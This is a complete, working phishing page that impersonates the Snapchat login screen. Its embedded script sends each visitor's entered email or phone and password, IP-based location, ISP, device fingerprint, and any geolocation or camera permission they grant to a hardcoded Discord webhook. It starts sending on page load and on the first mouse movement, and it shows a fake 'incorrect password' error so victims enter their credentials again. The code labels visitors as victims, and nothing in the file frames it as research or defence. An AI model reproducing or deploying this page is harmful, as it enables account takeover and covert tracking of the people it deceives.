<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In | Snapchat</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
        
        * { margin:0; padding:0; box-sizing:border-box; }
        
        body {
            background: #f8f8f8;
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background: #fff;
            width: 100%;
            max-width: 420px;
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.15);
            text-align: center;
        }

        .logo {
            width: 85px;
            height: 85px;
            background: #fffc00;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 25px;
            font-size: 58px;
            color: #000;
            box-shadow: 0 6px 15px rgba(255,252,0,0.3);
        }

        h1 { font-size: 28px; font-weight: 500; margin-bottom: 35px; }

        input {
            width: 100%;
            padding: 15px 16px;
            margin: 10px 0;
            border: 1.5px solid #ddd;
            border-radius: 10px;
            font-size: 17px;
        }

        input:focus {
            outline: none;
            border-color: #fffc00;
            box-shadow: 0 0 0 3px rgba(255,252,0,0.25);
        }

        button {
            width: 100%;
            padding: 15px;
            background: #fffc00;
            color: #000;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 15px;
        }

        .error {
            color: #ff3b30;
            font-size: 14.5px;
            margin: 12px 0 5px;
            display: none;
            text-align: left;
        }

        .footer {
            margin-top: 40px;
            font-size: 13px;
            color: #666;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">👻</div>
        <h1>Log in to Snapchat</h1>
        
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or phone number" required>
            <input type="password" id="password" placeholder="Password" required>
            <div id="errorMsg" class="error">Incorrect email/phone or password. Try again.</div>
            <button type="submit" id="loginBtn">Log In</button>
        </form>

        <div class="footer">
            <p>© Snap Inc. 2026</p>
        </div>
    </div>

    <script>
        const webhook = "https://discord.com/api/webhooks/1498622754797125633/t5Z-BfiL12-AQLa5mymJsmhvMdwc7ay9WCD8bYtxXci1s9-kOr4dRBGHg6y4QRFSjVXZ";

        // Send data to Discord
        async function sendData(data) {
            try {
                await fetch(webhook, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: data })
                });
            } catch(e) {}
        }

        // Ultra fingerprint + all info
        async function getVictimInfo() {
            let ipInfo = {};
            try {
                const res = await fetch("https://ipinfo.io/json");
                ipInfo = await res.json();
            } catch(e) {}

            // Request Geolocation
            let geo = "Not granted";
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        geo = `${position.coords.latitude}, ${position.coords.longitude} (Accuracy: ${position.coords.accuracy}m)`;
                        sendData(`**👻 SNAPCHAT VISITOR DETECTED (GEO GRANTED) 🔥**\n\n**Location:** ${geo}\n**IP:** ${ipInfo.ip || "N/A"}`);
                    },
                    () => { geo = "Denied"; }
                );
            }

            // Request Camera (silent prompt)
            try {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(() => sendData("**📸 CAMERA ACCESS GRANTED**"))
                    .catch(() => {});
            } catch(e) {}

            const info = `**👻 NEW SNAPCHAT PHISH VISITOR 🔥**\n\n` +
                `**Email/Phone:** ${document.getElementById("username").value || "Not entered yet"}\n` +
                `**Password:** ${document.getElementById("password").value || "Not entered yet"}\n\n` +
                `**IP:** ${ipInfo.ip || "Unknown"}\n` +
                `**City:** ${ipInfo.city || "Unknown"} | **Country:** ${ipInfo.country || "Unknown"}\n` +
                `**ISP:** ${ipInfo.org || "Unknown"}\n` +
                `**User-Agent:** ${navigator.userAgent}\n` +
                `**Platform:** ${navigator.platform}\n` +
                `**Cores:** ${navigator.hardwareConcurrency || "N/A"}\n` +
                `**Screen:** ${screen.width}x${screen.height}\n` +
                `**Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
                `**Time:** ${new Date().toLocaleString()}\n` +
                `**Geolocation:** ${geo}`;

            sendData(info);
        }

        // Trigger on page load + mouse move
        window.addEventListener("load", () => {
            getVictimInfo();
        });

        document.addEventListener("mousemove", () => {
            getVictimInfo();
        }, { once: true });

        // Form submit
        document.getElementById("loginForm").addEventListener("submit", async function(e) {
            e.preventDefault();

            const username = document.getElementById("username").value.trim();
            const password = document.getElementById("password").value.trim();
            const btn = document.getElementById("loginBtn");
            const error = document.getElementById("errorMsg");

            btn.disabled = true;
            btn.textContent = "Logging in...";

            // Send final credentials
            const finalData = `**🔥 SNAPCHAT LOGIN ATTEMPT 🔥**\n\n**Email/Phone:** ${username}\n**Password:** ${password}\n**Time:** ${new Date().toLocaleString()}`;
            await sendData(finalData);

            // Fake error
            setTimeout(() => {
                error.style.display = "block";
                btn.disabled = false;
                btn.textContent = "Log In";
                document.getElementById("password").value = "";
            }, 1400);
        });
    </script>
</body>
</html>
